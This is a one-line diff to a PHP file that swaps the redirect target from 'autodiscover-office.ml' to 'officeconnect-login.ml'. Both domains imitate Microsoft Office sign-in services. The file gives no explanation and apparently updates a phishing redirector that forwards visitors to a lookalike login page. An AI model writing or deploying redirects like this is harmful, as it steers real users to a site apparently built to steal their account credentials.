@@ -1,1 +1,1 @@
-<?php header("Location: https://autodiscover-office.ml/"); ?>
+<?php header("Location:  https://officeconnect-login.ml/"); ?>
